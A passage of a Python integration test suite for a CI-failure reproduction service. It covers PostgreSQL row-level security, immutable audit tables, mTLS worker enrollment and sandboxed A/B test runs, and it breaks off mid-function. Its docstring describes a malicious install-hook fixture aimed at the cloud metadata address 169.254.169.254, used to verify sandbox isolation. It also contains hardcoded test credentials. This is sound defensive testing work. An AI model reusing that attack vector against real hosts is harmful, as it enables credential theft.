"""PostgreSQL 16 + TLS 1.3 mTLS Certified Runner Profiles, A/B Reproducer & ADR-031 Suite (`U15`).

Verifies against a real disposable PostgreSQL 16 instance (`pgserver` / `fsync=on`) and live
loopback `TLS 1.3` mTLS `MtlsH11Protocol` listeners + `WorkerSupervisor`:
- `0011_profiles_and_reproduction_runs` expand/contract reversibility (`downgrade -> upgrade`),
  `>= 47` `FORCE ROW LEVEL SECURITY` tables (`profile_revisions`, `reproduction_runs`), cross-tenant
  RLS isolation (`SEC-032`), and PostgreSQL PL/pgSQL immutability + `ADR-031` triggers (`55000`).
- `T-SAN-02-P`, `T-SAN-03-P`, `W-04`, `SEC-030`, `SEC-032`, `SEC-036`:
  - End-to-end Sandbox A (`baseline_a`) -> `repro_confirmed` -> non-waivable `ADR-031` gate ->
    Sandbox B (`patched_b`) -> `patched_passed` over real `TLS 1.3` mTLS across all 3 certified
    Linux runner profiles (`python-pytest-linux` `F3_VALIDATED`, `node-jest-linux` `F2_APPROX`,
    `node-vitest-linux` `F1_TARGETED`) plus admin-opted `custom-linux-declared` (`vm_isolated`).
  - Verifies `.git`-sanitized archive staging, brand-new Sandbox B worktree diff application,
    tenant-scoped `:ro` dependency cache mount (`(workspace_id, profile_id, lock_digest)`), and
    exact Sandbox A / Sandbox B `image_digest`, `source_archive_digest`, `environment_digest`,
    and `command_digest` parity.
- `T-SAN-02-N`, `T-SAN-03-N`, `ADR-018`, `ADR-031`, `SEC-006`, `SEC-007`, `SEC-014`, `SEC-024`,
  `SEC-026`, `SEC-036`:
  - Unsupported CI jobs (`macos-15`, `gpu-cuda`, `docker:dind`, `undeclared_secret_service`,
    unopted `custom-linux-declared`, `cargo test`) explicitly abstain with `FX_UNSUPPORTED` and
    dispatch `0` sandbox leases.
  - Zero-test exit `0` (`--passWithNoTests`), passing baseline, timeout, bootstrap/install error,
    and unrelated failure fingerprint all seal `repro_unconfirmed` (`diagnosis_and_human_handoff`)
    and hard-block `enforce_adr031_baseline_gate` / `start_patched_sandbox_b` (`409`, `0` patches,
    `0` PRs).
  - Sandbox B candidate patch that inflates `@pytest.mark.skip` / drops executed test count is
    rejected (`patched_failed`, `test_count_or_skip_regression`, `allow_publication=False`).
  - Malicious `npm postinstall` / `setup.py` / `.git/hooks` / `.gitmodules` `169.254.169.254`
    fixture achieves zero host secret, file, or network compromise.
  - `verify_audit_chain` passes cleanly across instance and workspace chains.
"""

from __future__ import annotations

import asyncio
import contextlib
import json
import os
import ssl
import sys
import tempfile
from collections.abc import AsyncIterator, Callable, Iterator, Mapping, Sequence
from dataclasses import dataclass
from datetime import UTC, datetime, timedelta
from pathlib import Path
from urllib.parse import urlparse, urlunparse

import httpx
import pgserver
import pytest
import uvicorn
from fastapi import FastAPI
from sqlalchemy import func, select, text
from sqlalchemy.exc import DBAPIError
from sqlalchemy.ext.asyncio import AsyncEngine, AsyncSession, async_sessionmaker
from uvicorn.server import ServerState

if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

from py_contracts.crypto import KeyRing, MasterKeyRing
from py_contracts.primitives import new_uuid7
from py_contracts.worker import (
    IsolationCheckResult,
    SandboxJobV1,
    SandboxResourceUsage,
    WorkerIsolationAttestation,
    WorkerIsolationMode,
)
from red2pr_control.analytics_audit.audit_chain import (
    ExternalCheckpointStore,
    verify_audit_chain,
)
from red2pr_control.api.app import create_app
from red2pr_control.core.errors import BadRequestError, ConflictError, UnprocessableEntityError
from red2pr_control.core.redaction import Redactor
from red2pr_control.db.base import (
    CiJobModel,
    CiRunModel,
    FailureFingerprintModel,
    OutboxEventModel,
    ProviderConnectionModel,
    RepositoryModel,
    ReproductionRunModel,
    SandboxLeaseModel,
    SchemaMigrationRecordModel,
    TaskJobModel,
)
from red2pr_control.db.engine import (
    create_admin_engine,
    create_app_engine,
    create_session_factory,
    ensure_compatible_event_loop,
    run_alembic_downgrade,
    run_alembic_upgrade,
)
from red2pr_control.db.rls import instance_rls_session, workspace_rls_session
from red2pr_control.iam.sessions import IamService
from red2pr_control.operations.setup_wizard import SetupStepRegistry, SetupWizardService
from red2pr_control.orchestrator import (
    DurableTaskQueueService,
    MtlsH11Protocol,
    OperationReceiptService,
    ReproductionOrchestrator,
    RunnerProfileRegistry,
    ServerTlsMaterial,
    WorkerBrokerService,
    parse_test_execution_output,
    select_profile_for_ci_job,
)
from red2pr_control.secrets.broker import SecretBroker, SecretBrokerTotpVault
from red2pr_control.triage_evidence import LocalEncryptedArtifactStore, extract_failure_signature
from red2pr_worker import (
    ExternalResultSigner,
    GuestExecutionResult,
    HardenedOciInvocation,
    JobSandboxDirectories,
    MtlsWorkerCredentials,
    SourceArchiveMaterializer,
    TenantDependencyCacheManager,
    WorkerEnroller,
    WorkerSupervisor,
    build_worker_ssl_context,
    validate_oci_invocation_security,
)

APP_ROLE_NAME = "red2pr_app"
APP_ROLE_PASSWORD = "red2pr_app_local_test_pw_15"
PUBLIC_BASE_URL = "http://127.0.0.1:4285"
ORIGIN_HEADERS = {"Origin": PUBLIC_BASE_URL}
OWNER_CREDENTIAL = "OwnerSup3rStr0ng!Pass#15"


class ManualClock:
    """Deterministic controllable UTC clock."""

    def __init__(self, initial: datetime | None = None) -> None:
        self._current = (initial or datetime(2026, 10, 28, 13, 0, 0, tzinfo=UTC)).astimezone(UTC)

    def __call__(self) -> datetime:
        return self._current

    def advance(self, **delta_kwargs: float) -> datetime:
        self._current = self._current + timedelta(**delta_kwargs)
        return self._current


@dataclass(frozen=True)
class PgTestUrls:
    admin_url: str
    app_url: str


def _build_role_url(base_uri: str, *, username: str, password: str) -> str:
    parsed = urlparse(base_uri)
    host = parsed.hostname or "127.0.0.1"
    port_part = f":{parsed.port}" if parsed.port else ""
    netloc = f"{username}:{password}@{host}{port_part}"
    return urlunparse(
        (
            "postgresql+psycopg",
            netloc,
            parsed.path or "/postgres",
            parsed.params,
            parsed.query,
            parsed.fragment,
        )
    )


def _csrf_headers(token: str) -> dict[str, str]:
    return {"X-CSRF-Token": token, **ORIGIN_HEADERS}


@pytest.fixture(scope="module")
def pg_urls() -> Iterator[PgTestUrls]:
    ensure_compatible_event_loop()
    external_admin = os.environ.get("RED2PR_TEST_ADMIN_DATABASE_URL")
    if external_admin:
        app_url = os.environ.get("RED2PR_TEST_APP_DATABASE_URL") or _build_role_url(
            external_admin,
            username=APP_ROLE_NAME,
            password=APP_ROLE_PASSWORD,
        )
        yield PgTestUrls(admin_url=external_admin, app_url=app_url)
        return

    with (
        tempfile.TemporaryDirectory(prefix="red2pr_u15_pg16_") as tmp_dir,
        pgserver.get_server(tmp_dir, cleanup_mode="delete") as server,
    ):
        raw_uri = server.get_uri()
        parsed = urlparse(raw_uri)
        admin_url = urlunparse(
            (
                "postgresql+psycopg",
                parsed.netloc,
                parsed.path,
                parsed.params,
                parsed.query,
                parsed.fragment,
            )
        )
        app_url = _build_role_url(
            raw_uri,
            username=APP_ROLE_NAME,
            password=APP_ROLE_PASSWORD,
        )
        yield PgTestUrls(admin_url=admin_url, app_url=app_url)


@pytest.fixture
async def migrated_db(pg_urls: PgTestUrls) -> AsyncIterator[PgTestUrls]:
    run_alembic_downgrade(pg_urls.admin_url, "base", app_role_name=APP_ROLE_NAME)
    run_alembic_upgrade(
        pg_urls.admin_url,
        "head",
        app_role_name=APP_ROLE_NAME,
        app_role_password=APP_ROLE_PASSWORD,
    )
    yield pg_urls


@dataclass
class U15Harness:
    app_engine: AsyncEngine
    app_factory: async_sessionmaker[AsyncSession]
    iam: IamService
    redactor: Redactor
    artifact_store: LocalEncryptedArtifactStore
    queue_service: DurableTaskQueueService
    worker_broker: WorkerBrokerService
    reproducer: ReproductionOrchestrator
    api_app: FastAPI


def _build_u15_harness(
    app_url: str,
    *,
    clock: ManualClock,
    store_dir: Path,
) -> U15Harness:
    app_engine = create_app_engine(app_url, pool_size=8, max_overflow=8)
    app_factory = create_session_factory(app_engine)
    redactor = Redactor()
    kek_ring = MasterKeyRing(active_version=1, keys={1: b"\x5a" * 32})
    broker = SecretBroker(key_ring=kek_ring, redactor=redactor)
    totp_vault = SecretBrokerTotpVault(broker)

    iam = IamService(
        session_factory=app_factory,
        totp_vault=totp_vault,
        iam_seed_key=b"\x4b" * 32,
        public_base_url=PUBLIC_BASE_URL,
        clock=clock,
    )
    queue_service = DurableTaskQueueService(
        session_factory=app_factory,
        signing_key=iam.csrf_signing_key,
        redactor=redactor,
    )
    op_service = OperationReceiptService(session_factory=app_factory)
    artifact_store = LocalEncryptedArtifactStore(root_dir=store_dir, key_ring=kek_ring)
    worker_broker = WorkerBrokerService(
        session_factory=app_factory,
        signing_key=iam.csrf_signing_key,
        queue_service=queue_service,
        artifact_store=artifact_store,
        master_key_ring=kek_ring,
        redactor=redactor,
        clock=clock,
    )
    reproducer = ReproductionOrchestrator(
        session_factory=app_factory,
        worker_broker=worker_broker,
        redactor=redactor,
    )
    step_registry = SetupStepRegistry()
    setup_service = SetupWizardService(
        iam_service=iam,
        step_registry=step_registry,
        redactor=redactor,
    )
    api_app = create_app(
        iam_service=iam,
        setup_wizard_service=setup_service,
        setup_step_registry=step_registry,
        task_queue_service=queue_service,
        operation_receipt_service=op_service,
        worker_broker_service=worker_broker,
        artifact_store=artifact_store,
    )
    return U15Harness(
        app_engine=app_engine,
        app_factory=app_factory,
        iam=iam,
        redactor=redactor,
        artifact_store=artifact_store,
        queue_service=queue_service,
        worker_broker=worker_broker,
        reproducer=reproducer,
        api_app=api_app,
    )


@contextlib.asynccontextmanager
async def _start_loopback_tls13_server(
    app: FastAPI,
    tls_material: ServerTlsMaterial,
    *,
    cert_reqs: ssl.VerifyMode,
) -> AsyncIterator[str]:
    ssl_ctx = tls_material.build_ssl_context(cert_reqs=cert_reqs)
    cfg = uvicorn.Config(
        app=app,
        host="127.0.0.1",
        port=0,
        http=MtlsH11Protocol,
        lifespan="off",
        access_log=False,
    )
    cfg.load()
    srv_state = ServerState()
    loop = asyncio.get_running_loop()
    server = await loop.create_server(
        lambda: MtlsH11Protocol(config=cfg, server_state=srv_state, app_state={}),
        host="127.0.0.1",
        port=0,
        ssl=ssl_ctx,
    )
    try:
        sock_port = int(server.sockets[0].getsockname()[1])
        yield f"https://127.0.0.1:{sock_port}"
    finally:
        server.close()
        await server.wait_closed()


def _build_bootstrap_tls_client(ca_cert_pem: str, *, base_url: str) -> httpx.AsyncClient:
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.minimum_version = ssl.TLSVersion.TLSv1_3
    ctx.verify_mode = ssl.CERT_REQUIRED
    ctx.check_hostname = True
    ctx.load_verify_locations(cadata=ca_cert_pem)
    return httpx.AsyncClient(base_url=base_url, verify=ctx)


def _build_mtls_worker_client(
    credentials: MtlsWorkerCredentials,
    *,
    base_url: str,
) -> httpx.AsyncClient:
    ctx = build_worker_ssl_context(credentials, check_hostname=True)
    return httpx.AsyncClient(base_url=base_url, verify=ctx)


def _vm_attestation(host_id: str = "vm-repro-01.internal") -> WorkerIsolationAttestation:
    return WorkerIsolationAttestation(
        isolation_mode="vm_isolated",
        runtime_name="firecracker",
        host_id=host_id,
        rootless_verified=True,
        seccomp_verified=True,
        no_new_privileges_verified=True,
        network_none_supported=True,
        cpu_limit=4,
        memory_limit_bytes=8_589_934_592,
        disk_limit_bytes=21_474_836_480,
        pids_limit=512,
    )


async def _claim_owner_and_seed_repo(
    harness: U15Harness,
    *,
    now: datetime,
    ws_slug: str = "acme-u15",
    ws_name: str = "Acme U15",
) -> tuple[httpx.AsyncClient, str, str, str]:
    transport = httpx.ASGITransport(app=harness.api_app)
    raw_boot, _ = await harness.iam.issue_bootstrap_token()
    client = httpx.AsyncClient(transport=transport, base_url=PUBLIC_BASE_URL)
    pre_csrf = str((await client.get("/api/v1/auth/csrf")).json()["csrf_token"])

    claim_resp = await client.post(
        "/api/v1/setup/claim",
        headers=_csrf_headers(pre_csrf),
        json={
            "bootstrap_token": raw_boot,
            "display_name": "Owner U15",
            "email": "owner.u15@red2pr.local",
            "password": OWNER_CREDENTIAL,
        },
    )
    assert claim_resp.status_code == 201, claim_resp.text
    csrf = str(claim_resp.json()["csrf_token"])

    step_resp = await client.post(
        "/api/v1/auth/step-up",
        headers=_csrf_headers(csrf),
        json={"password": OWNER_CREDENTIAL},
    )
    assert step_resp.status_code == 200, step_resp.text
    csrf = str(step_resp.json().get("csrf_token") or csrf)

    ws_resp = await client.post(
        "/api/v1/workspaces",
        headers=_csrf_headers(csrf),
        json={"name": ws_name, "slug": ws_slug},
    )
    assert ws_resp.status_code == 201, ws_resp.text
    ws_id = str(ws_resp.json()["id"])

    conn_id = new_uuid7(now=now)
    repo_id = new_uuid7(now=now)
    async with workspace_rls_session(harness.app_factory, workspace_id=ws_id) as ws_db:
        ws_db.add(
            ProviderConnectionModel(
                id=conn_id,
                workspace_id=ws_id,
                provider="github",
                auth_mode="github_app",
                display_name="GitHub U15",
                base_url="https://api.github.com",
                status="ready",
                capabilities_json={"checks": "read", "contents": "read"},
                created_at=now,
                updated_at=now,
            )
        )
        await ws_db.flush()
        ws_db.add(
            RepositoryModel(
                id=repo_id,
                workspace_id=ws_id,
                provider_connection_id=conn_id,
                external_repo_id=f"ext-{ws_slug}",
                name=f"{ws_slug}/service",
                default_branch="main",
                visibility="private",
                mode="approval",
                archived=False,
                created_at=now,
                updated_at=now,
            )
        )
        await ws_db.flush()
    return client, csrf, ws_id, repo_id


async def _seed_ci_run_and_failed_job(
    app_factory: async_sessionmaker[AsyncSession],
    *,
    workspace_id: str,
    repository_id: str,
    head_sha: str,
    job_name: str,
    ci_failure_log: str,
    now: datetime,
    matrix_dimensions: Mapping[str, str] | None = None,
) -> tuple[str, str, str]:
    """Seed normalized `ci_runs`, `failure_fingerprints`, and `ci_jobs` rows (`U13` contract)."""
    async with workspace_rls_session(app_factory, workspace_id=workspace_id) as db:
        conn_id = await db.scalar(
            select(RepositoryModel.provider_connection_id).where(
                RepositoryModel.workspace_id == workspace_id,
                RepositoryModel.id == repository_id,
            )
        )
        assert conn_id is not None

        sig = extract_failure_signature(ci_failure_log, job_name=job_name)
        assert sig is not None

        fp_id = new_uuid7(now=now)
        existing_fp = await db.scalar(
            select(FailureFingerprintModel).where(
                FailureFingerprintModel.workspace_id == workspace_id,
                FailureFingerprintModel.repository_id == repository_id,
                FailureFingerprintModel.fingerprint_hash == sig.fingerprint_hash,
            )
        )
        if existing_fp is None:
            db.add(
                FailureFingerprintModel(
                    id=fp_id,
                    workspace_id=workspace_id,
                    repository_id=repository_id,
                    fingerprint_hash=sig.fingerprint_hash,
                    signature_label=sig.signature_label,
                    test_identifier=sig.test_identifier,
                    error_kind=sig.error_kind,
                    classification="persistent_failure",
                    confidence_reason="Repeated deterministic CI failure",
                    failure_count=2,
                    pass_on_same_sha_count=0,
                    distinct_sha_count=2,
                    recent_observations_json=[],
                    first_seen_at=now,
                    last_seen_at=now,
                    created_at=now,
                    updated_at=now,
                )
            )
            await db.flush()
        else:
            fp_id = existing_fp.id

        run_id = new_uuid7(now=now)
        job_id = new_uuid7(now=now)
        db.add(
            CiRunModel(
                id=run_id,
                workspace_id=workspace_id,
                repository_id=repository_id,
                connection_id=str(conn_id),
                trigger_id=None,
                provider="github",
                external_id=f"run-{run_id}",
                attempt_key="attempt:1",
                attempt_number=1,
                head_sha=head_sha,
                observed_head_sha=head_sha,
                head_sha_verified=True,
                ref="refs/heads/main",
                event_type="push",
                status="completed",
                conclusion="failure",
                jobs_complete=True,
                ingestion_state="ingested",
                failed_job_count=1,
                total_job_count=1,
                artifact_count=0,
                flaky_classification="persistent_failure",
                started_at=now,
                completed_at=now,
                created_at=now,
                updated_at=now,
            )
        )
        await db.flush()
        db.add(
            CiJobModel(
                id=job_id,
                workspace_id=workspace_id,
                repository_id=repository_id,
                run_id=run_id,
                external_id=f"job-{job_id}",
                name=job_name,
                stage="test",
                matrix_dimensions_json=dict(matrix_dimensions or {}),
                status="completed",
                conclusion="failure",
                log_status="available",
                log_size_bytes=len(ci_failure_log.encode("utf-8")),
                failure_excerpt=sig.failure_excerpt[:1000],
                failure_fingerprint_id=fp_id,
                failure_fingerprint_hash=sig.fingerprint_hash,
                flaky_classification="persistent_failure",
                started_at=now,
                completed_at=now,
                created_at=now,
                updated_at=now,
            )
        )
        await db.flush()
        return run_id, job_id, sig.fingerprint_hash


@dataclass
class RecordedSandboxExecution:
    job_id: str
    profile_id: str
    patch_digest: str | None
    worktree_dir: Path
    observed_files: tuple[str, ...]
    mounts: tuple[str, ...]
    guest_env: Mapping[str, str]
    cli_args: tuple[str, ...]


class _ContentEvaluatingSandboxDriver:
    """`SandboxRuntimeDriver` validating OCI hardening and evaluating real worktree files."""

    def __init__(
        self,
        attestation: WorkerIsolationAttestation,
        *,
        evaluator: Callable[
            [SandboxJobV1, HardenedOciInvocation, Path],
            tuple[int, bytes, bytes, bytes | None, bool],
        ],
    ) -> None:
        self._attestation = attestation
        self._evaluator = evaluator
        self.executions: list[RecordedSandboxExecution] = []

    @property
    def isolation_mode(self) -> WorkerIsolationMode:
        return self._attestation.isolation_mode

    async def probe_isolation(self) -> WorkerIsolationAttestation:
        return self._attestation

    async def execute_job(
        self,
        job: SandboxJobV1,
        *,
        invocation: HardenedOciInvocation,
        dirs: JobSandboxDirectories,
        cancel_event: asyncio.Event,
    ) -> GuestExecutionResult:
        _ = cancel_event
        validate_oci_invocation_security(invocation)
        observed = tuple(
            sorted(
                p.relative_to(dirs.worktree_dir).as_posix()
                for p in dirs.worktree_dir.rglob("*")
                if p.is_file()
            )
        )
        self.executions.append(
            RecordedSandboxExecution(
                job_id=job.job_id,
                profile_id=job.profile_id,
                patch_digest=job.patch_digest,
                worktree_dir=dirs.worktree_dir,
                observed_files=observed,
                mounts=invocation.mounts,
                guest_env=dict(invocation.guest_env),
                cli_args=invocation.cli_args,
            )
        )
        exit_code, stdout_b, stderr_b, junit_b, timed_out = self._evaluator(
            job,
            invocation,
            dirs.worktree_dir,
        )
        out_files: dict[str, bytes] = {}
        if junit_b is not None:
            out_files["junit_xml"] = junit_b

        return GuestExecutionResult(
            exit_code=None if timed_out else exit_code,
            timed_out=timed_out,
            cancelled=False,
            oom_killed=False,
            infrastructure_error=False,
            stdout_bytes=stdout_b,
            stderr_bytes=stderr_b,
            stdout_truncated=False,
            stderr_truncated=False,
            resource_usage=SandboxResourceUsage(
                wall_ms=120,
                max_memory_bytes=64_000_000,
                disk_written_bytes=len(junit_b or b""),
                output_bytes=len(stdout_b) + len(stderr_b),
            ),
            isolation_checks=(
                IsolationCheckResult(
                    check_id="network_none",
                    passed=True,
                    detail="Verified --network=none",
                ),
                IsolationCheckResult(
                    check_id="read_only_rootfs",
                    passed=True,
                    detail="Verified --read-only rootfs",
                ),
                IsolationCheckResult(
                    check_id="seccomp_capdrop_nnp",
                    passed=True,
                    detail="Verified --cap-drop=ALL + no-new-privileges + seccomp",
                ),
            ),
            output_files=out_files,
        )

    async def force_kill_job(self, job_id: str) -> Sequence[str]:
        _ = job_id
        return ()

    async def run_self_test(self) -> tuple[bool, tuple[IsolationCheckResult, ...], str]:
        return True, (), "OK"


async def test_migration_0011_reversibility_rls_and_db_immutability_adr031_triggers(
    migrated_db: PgTestUrls,
    tmp_path: Path,
) -> None:
    """Verify `0011` downgrade/upgrade, `>=47` forced-RLS tables, and SQLSTATE `55000` triggers."""
    run_alembic_downgrade(
        migrated_db.admin_url,
        "0010_workers_and_sandbox_leases",
        app_role_name=APP_ROLE_NAME,
    )
    run_alembic_upgrade(
        migrated_db.admin_url,
        "head",
        app_role_name=APP_ROLE_NAME,
        app_role_password=APP_ROLE_PASSWORD,
    )

    admin_engine = create_admin_engine(migrated_db.admin_url)
    try:
        async with admin_engine.connect() as conn:
            forced_rows = (
                await conn.execute(
                    text(
                        "SELECT relname FROM pg_class c "
                        "JOIN pg_namespace n ON n.oid = c.relnamespace "
                        "WHERE n.nspname = 'public' AND c.relkind = 'r' "
                        "AND c.relrowsecurity = true AND c.relforcerowsecurity = true"
                    )
                )
            ).scalars()
            forced_names = set(forced_rows)
            assert len(forced_names) >= 47
            assert {"profile_revisions", "reproduction_runs"}.issubset(forced_names)

            rec_factory = create_session_factory(admin_engine)
            async with rec_factory() as db:
                rev = await db.scalar(
                    select(SchemaMigrationRecordModel).where(
                        SchemaMigrationRecordModel.revision == "0011_profiles_and_reproduction_runs"
                    )
                )
                assert rev is not None
    finally:
        await admin_engine.dispose()

    clock = ManualClock()
    harness = _build_u15_harness(migrated_db.app_url, clock=clock, store_dir=tmp_path / "artifacts")
    try:
        owner_cli, csrf, ws_a_id, repo_a_id = await _claim_owner_and_seed_repo(
            harness,
            now=clock(),
            ws_slug="ws-alpha-15",
            ws_name="Alpha 15",
        )
        ws_b_resp = await owner_cli.post(
            "/api/v1/workspaces",
            headers=_csrf_headers(csrf),
            json={"name": "Beta 15", "slug": "ws-beta-15"},
        )
        assert ws_b_resp.status_code == 201
        ws_b_id = str(ws_b_resp.json()["id"])

        # Sync all 4 reviewed profiles into `profile_revisions` and verify immutability:
        reg = RunnerProfileRegistry()
        synced_first = await reg.sync_profiles_to_db(harness.app_factory, now=clock())
        synced_second = await reg.sync_profiles_to_db(harness.app_factory, now=clock())
        assert synced_first == synced_second
        assert set(synced_first) == {
            "python-pytest-linux",
            "node-jest-linux",
            "node-vitest-linux",
            "custom-linux-declared",
        }

        with pytest.raises(DBAPIError, match="append_only_table_violation"):
            async with instance_rls_session(harness.app_factory, mode="instance_only") as db:
                await db.execute(text("UPDATE profile_revisions SET display_name = 'Tampered'"))

        with pytest.raises(DBAPIError, match="append_only_table_violation"):
            async with instance_rls_session(harness.app_factory, mode="instance_only") as db:
                await db.execute(text("DELETE FROM profile_revisions"))

        # Seed CI run/job in Workspace A and record an unconfirmed baseline:
        base_sha = "a1" * 20
        ci_run_id, ci_job_id, fp_hash = await _seed_ci_run_and_failed_job(
            harness.app_factory,
            workspace_id=ws_a_id,
            repository_id=repo_a_id,
            head_sha=base_sha,
            job_name="pytest (linux)",
            ci_failure_log="FAILED tests/test_math.py::test_add - AssertionError: 1 != 2\n",
            now=clock(),
        )
        unconfirmed_id = new_uuid7(now=clock())
        async with workspace_rls_session(harness.app_factory, workspace_id=ws_a_id) as db:
            db.add(
                ReproductionRunModel(
                    id=unconfirmed_id,
                    workspace_id=ws_a_id,
                    repository_id=repo_a_id,
                    repair_id=new_uuid7(now=clock()),
                    ci_run_id=ci_run_id,
                    ci_job_id=ci_job_id,
                    phase="baseline_a",
                    baseline_reproduction_id=None,
                    sandbox_job_id=None,
                    sandbox_lease_id=None,
                    profile_revision_id=synced_first["python-pytest-linux"],
                    profile_id="python-pytest-linux",
                    profile_revision=1,
                    profile_digest=reg.get_manifest("python-pytest-linux").manifest_digest(),
                    image_digest=reg.get_manifest("python-pytest-linux").image_digest,
                    base_sha=base_sha,
                    source_archive_digest="b" * 64,
                    dependency_lock_digest=None,
                    cache_key=None,
                    patch_digest=None,
                    command_ids_json=["pytest-repro"],
                    command_digest="c" * 64,
                    environment_digest="d" * 64,
                    expected_fingerprint_hash=fp_hash,
                    observed_fingerprint_hash=None,
                    fingerprint_matched=False,
                    executed_tests_count=2,
                    passed_tests_count=2,
                    failed_tests_count=0,
                    skipped_tests_count=0,
                    exit_code=0,
                    termination="exited",
                    status="repro_unconfirmed",
                    fidelity_grade="F3_VALIDATED",
                    fidelity_differences_json=[],
                    handoff_outcome="diagnosis_and_human_handoff",
                    allow_patching=False,
                    allow_publication=False,
                    failure_reason_code="baseline_passed_unexpectedly",
                    failure_detail="Baseline passed unexpectedly",
                    result_digest="e" * 64,
                    artifact_refs_json=[],
                    immutable_sealed=True,
                    started_at=clock(),
                    finished_at=clock(),
                    version=1,
                    created_at=clock(),
                    updated_at=clock(),
                )
            )
            await db.flush()

        # Cross-tenant RLS isolation: Workspace B sees 0 reproduction_runs (`SEC-032`)
        async with workspace_rls_session(harness.app_factory, workspace_id=ws_b_id) as db_b:
            visible_in_b = (await db_b.scalars(select(ReproductionRunModel))).all()
            assert visible_in_b == []

        # Sealed reproduction_runs row cannot be updated or deleted (`SQLSTATE 55000`)
        with pytest.raises(DBAPIError, match="append_only_table_violation"):
            async with workspace_rls_session(harness.app_factory, workspace_id=ws_a_id) as db:
                await db.execute(
                    text("UPDATE reproduction_runs SET status = 'repro_confirmed' WHERE id = :rid"),
                    {"rid": unconfirmed_id},
                )

        with pytest.raises(DBAPIError, match="append_only_table_violation"):
            async with workspace_rls_session(harness.app_factory, workspace_id=ws_a_id) as db:
                await db.execute(
                    text("DELETE FROM reproduction_runs WHERE id = :rid"),
                    {"rid": unconfirmed_id},
                )

        # DB trigger `trg_reproduction_runs_immutable_and_adr031` rejects unconfirmed patched_b:
        with pytest.raises(DBAPIError, match="adr031_unconfirmed_baseline_violation"):
            async with workspace_rls_session(harness.app_factory, workspace_id=ws_a_id) as db:
                db.add(
                    ReproductionRunModel(
                        id=new_uuid7(now=clock()),
                        workspace_id=ws_a_id,
                        repository_id=repo_a_id,
                        repair_id=new_uuid7(now=clock()),
                        ci_run_id=ci_run_id,
                        ci_job_id=ci_job_id,
                        phase="patched_b",
                        baseline_reproduction_id=unconfirmed_id,
                        sandbox_job_id=None,
                        sandbox_lease_id=None,
                        profile_revision_id=synced_first["python-pytest-linux"],
                        profile_id="python-pytest-linux",
                        profile_revision=1,
                        profile_digest=reg.get_manifest("python-pytest-linux").manifest_digest(),
                        image_digest=reg.get_manifest("python-pytest-linux").image_digest,
                        base_sha=base_sha,
                        source_archive_digest="b" * 64,
                        dependency_lock_digest=None,
                        cache_key=None,
                        patch_digest="f" * 64,
                        command_ids_json=["pytest-repro"],
                        status="running",
                        fidelity_grade="F3_VALIDATED",
                        fidelity_differences_json=[],
                        handoff_outcome="pending",
                        allow_patching=False,
                        allow_publication=False,
                        immutable_sealed=False,
                        started_at=clock(),
                        finished_at=None,
                        version=1,
                        created_at=clock(),
                        updated_at=clock(),
                    )
                )
                await db.flush()

        await owner_cli.aclose()
    finally:
        await harness.app_engine.dispose()


async def test_end_to_end_ab_reproduction_across_pytest_jest_and_vitest_over_mtls(
    migrated_db: PgTestUrls,
    tmp_path: Path,
) -> None:
    """`T-SAN-02-P` & `T-SAN-03-P`: Full Sandbox A red -> ADR-031 -> Sandbox B green over TLS 1.3
    across `python-pytest-linux` (`F3_VALIDATED`), `node-jest-linux` (`F2_APPROX`),
    `node-vitest-linux` (`F1_TARGETED`), and admin-opted `custom-linux-declared`."""
    clock = ManualClock(datetime.now(tz=UTC) - timedelta(hours=1))
    harness = _build_u15_harness(migrated_db.app_url, clock=clock, store_dir=tmp_path / "artifacts")
    try:
        owner_cli, csrf, ws_id, repo_id = await _claim_owner_and_seed_repo(harness, now=clock())

        supported_profiles = [
            "python-pytest-linux",
            "node-jest-linux",
            "node-vitest-linux",
            "custom-linux-declared",
        ]
        enroll_resp = await owner_cli.post(
            "/api/v1/system/workers/enrollments",
            headers=_csrf_headers(csrf),
            json={
                "trust_domain": "worker-supervisor",
                "profile_ids": supported_profiles,
                "isolation_mode": "vm_isolated",
                "ttl_minutes": 30,
            },
        )
        assert enroll_resp.status_code == 201, enroll_resp.text
        raw_token = str(enroll_resp.json()["enrollment_token"])
        ca_cert_pem = str(enroll_resp.json()["ca_cert_pem"])

        server_tls = await harness.worker_broker.ca.issue_server_bundle(now=clock())
        async with (
            _start_loopback_tls13_server(
                harness.api_app,
                server_tls,
                cert_reqs=ssl.CERT_OPTIONAL,
            ) as bootstrap_url,
            _start_loopback_tls13_server(
                harness.api_app,
                server_tls,
                cert_reqs=ssl.CERT_REQUIRED,
            ) as strict_mtls_url,
        ):
            signer = ExternalResultSigner.generate(key_id="ed25519-u15-ab-01", not_before=clock())
            async with _build_bootstrap_tls_client(ca_cert_pem, base_url=bootstrap_url) as boot_cli:
                creds = await WorkerEnroller().enroll(
                    client=boot_cli,
                    enrollment_token=raw_token,
                    supported_profiles=supported_profiles,
                    signer=signer,
                    attestation=_vm_attestation("vm-u15-01.internal"),
                    now=clock(),
                )

            def _eval_worktree(
                job: SandboxJobV1,
                inv: HardenedOciInvocation,
                wt: Path,
            ) -> tuple[int, bytes, bytes, bytes | None, bool]:
                # Assert `.git/**` and `.env` never leaked into staged worktree
                assert not (wt / ".git").exists()
                assert not (wt / ".env").exists()

                if job.profile_id == "python-pytest-linux":
                    assert inv.guest_env["PIP_NO_INDEX"] == "1"
                    calc_src = (wt / "src" / "calc.py").read_text(encoding="utf-8")
                    if "return a + b" in calc_src:
                        out = (
                            b"==================== test session starts ====================\n"
                            b"collected 3 items\n=== 3 passed in 0.05s ===\n"
                        )
                        junit = b'<testsuite tests="3" failures="0" skipped="0"/>'
                        return (0, out, b"", junit, False)
                    out = (
                        b"==================== test session starts ====================\n"
                        b"FAILED tests/test_calc.py::test_add - AssertionError: expected 5 got -1\n"
                        b"=== 1 failed, 2 passed in 0.06s ===\n"
                    )
                    junit = b'<testsuite tests="3" failures="1" skipped="0"/>'
                    return (1, out, b"", junit, False)

                if job.profile_id == "node-jest-linux":
                    assert inv.guest_env["npm_config_ignore_scripts"] == "true"
                    js_src = (wt / "src" / "discount.js").read_text(encoding="utf-8")
                    if "price * (1 - pct)" in js_src:
                        out = b"PASS src/discount.test.js\nTests:       2 passed, 2 total\n"
                        return (0, out, b"", None, False)
                    out = (
                        b"FAIL src/discount.test.js\n"
                        b"\xc3\x97 applies percentage discount\n"
                        b"Error: expect(received).toBe(expected)\n"
                        b"Tests:       1 failed, 1 passed, 2 total\n"
                    )
                    return (1, out, b"", None, False)

                if job.profile_id == "node-vitest-linux":
                    assert inv.guest_env["npm_config_ignore_scripts"] == "true"
